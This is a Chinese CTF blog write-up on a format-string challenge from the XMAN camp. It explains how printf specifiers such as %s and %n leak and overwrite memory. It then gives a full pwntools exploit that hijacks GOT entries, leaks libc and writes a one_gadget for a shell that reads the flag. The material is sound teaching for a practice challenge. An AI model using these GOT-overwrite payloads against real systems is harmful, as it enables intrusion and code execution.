---
title: XMAN FMT
date: 2018-08-24 08:37:40
tags: [CTF, PWN]
categories: XMAN夏令营
---
## xman结营赛 fmt  
​	一个在xman的朋友扔了个fmt给我，然而我之前没有深入了解过格式化字符串，所以趁这次了解了一下。  
<!--more-->
	大致了解了一下，发现当调用printf等函数的时候，如果没有使用格式化字符串，直接输出字符串变量，正常情况下是可以直接输出的，程序也并没有报错；但是如果这个变量中保存的字符串是用户精心构造的，那就可能造成数据泄露，甚至任意命令执行。  
当用户调用printf函数直接输入字符串变量未使用格式化字符串而此变量中保存的字符串又刚好包含格式化字符串，则程序将会把变量中的也就是用户输入的格式化字符串解析为调用函数的格式化字符串，而把栈上的数据当作要操作的内容进行输出，这是32位的情况，如果程序是64位，则会把从rdi开始的寄存器也算进去，优先对寄存器进行输出等操作。  
常见的构造方式：
%c：输出字符，配上%n可用于向指定地址写数据。

%d：输出十进制整数，配上%n可用于向指定地址写数据。

%x：输出16进制数据，如`%i$x`表示要泄漏偏移i处4字节长的16进制数据，`%i$lx`表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。

%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。

%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如`%i$s`表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。

%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如`%100×10$n`表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而`%$hn`表示写入的地址空间为2字节，`%$hhn`表示写入的地址空间为1字节，`%$lln`表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过`%$hn`或`%$hhn`来适时调整。

%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。  
	了解了原理之后再来做题发现就简单了。  
	这道题的难点在于他没有循环，没有循环就造成一个问题，你最多只能泄露一次或者改写一次数据，而如果只能进行一次操作，那就很难getshell。所以直接一次去改写某个数据很难进行更深的操作，这里必须要有一个循环，聪明的我很快就注意到了（捂脸捂脸），程序开启了canary，而且可以进行溢出，一开始我想的是否能直接leak canary，但是这和之前一样没有循环，然后注意到stack_check_fail函数，想到了可以通过劫持stack_check_fail函数跳到程序开头重新执行，如果每次都进行溢出，那么就能构造一个循环。然后就是leak libc基地址，查找libc库，最后写one_gadget到exit函数。 
	基本思路确定了，接下来写exp时遇到不少问题，最多的就是输入输出流的接收一直没有搞好，导致输入一直阻塞，但是最终还是把exp写出来了。本地没有成功，但是确定能执行gadget，等以后再填坑吧，基本思路应该是没有错的。

```
from sys import argv
from pwn import *

context(os="linux", arch="amd64")
# context.log_level = "debug"
# r = process("./once_time", aslr=0)
r = remote(argv[1], 20004)
e = ELF("./once_time")
libc = e.libc

def sl(s):
	r.sendline(s)

def sd(s):
	r.send(s)

def rc(timeout=0):
	if timeout == 0:
		return r.recv()
	else:
		return r.recv(timeout=timeout)

def ru(s, timeout=0):
	if timeout == 0:
		return r.recvuntil(s)
	else:
		return r.recvuntil(s, timeout=timeout)

start = 0x400983

rc()
sl(p64(e.got["__stack_chk_fail"]))
rc()
payload = '%'+str(start)+"d%12$n"
payload = payload.ljust(0x20, "\x00")
sd(payload)
ru("input your name: ")
sl(p64(e.got["read"]))
ru("leave a msg: ")
# gdb.attach(r, "b *0x400968")
# # raw_input()
payload = "%12$s"
payload = payload.ljust(0x20, "\x00")
sd(payload)
libc.address = int(rc()[:6][::-1].encode("hex"), 16) - libc.symbols["read"]
log.info("libc > " + hex(libc.address))

# gdb.attach(r, "b *0x400968")
# # raw_input()
one_gadget = 0xf1147 + libc.address
log.info("one_gadget > " + hex(one_gadget))
sl(p64(e.got["exit"]))
ru("leave a msg: ")
# gdb.attach(r, "b *0x400968")
# # raw_input()
payload = "%" + str(one_gadget & 0xFFFF) + "d%12$hn"
payload = payload.ljust(0x20, "\x00")
sd(payload)
# raw_input()
ru("input your name: ")
# raw_input()

# gdb.attach(r, "b *0x400968")
# # raw_input()
sl(p64(e.got["exit"]+2))
ru("leave a msg: ")
# gdb.attach(r, "b *0x400968")
# # raw_input()
payload = "%" + str((one_gadget >> 16) & 0xFFFF) + "d%12$hn"
payload = payload.ljust(0x20, "\x00")
sd(payload)
# raw_input()
ru("input your name: ")
# raw_input()

# gdb.attach(r, "b *0x400968")
# # raw_input()
sl(p64(e.got["exit"]+4))
ru("leave a msg: ")
# gdb.attach(r, "b *0x400968")
# # raw_input()
payload = "%" + str((one_gadget >> 32) & 0xFFFF) + "d%12$hn"
payload = payload.ljust(0x20, "\x00")
sd(payload)
# raw_input()
ru("input your name: ")
# raw_input()

# gdb.attach(r, "b *0x400968")
# # raw_input()
sl(p64(e.got["exit"]+6))
ru("leave a msg: ")
log.info("one_gadget > " + hex(one_gadget))
# gdb.attach(r, """b *0x40094D
# b *0x400968""")
# raw_input()
log.info("one_gadget > " + hex((one_gadget >> 48) & 0xFFFF))
if (one_gadget >> 48) & 0xFFFF != 0:
	payload = "%" + str((one_gadget >> 48) & 0xFFFF) + "d%12$hn"
else:
	payload = "%12$hn"
payload = payload.ljust(0x20, "\x00")
sd(payload)
# raw_input()

ru("input your name: ")
sl('a')
ru("leave a msg: ")
sl("%p")
ru('\n')

f = open("./flags", "a")
sl('cat flag')
flag = rc(timeout=1).rstrip("\n")
log.info("flag > " + flag)
f.write(flag+'\n')
```

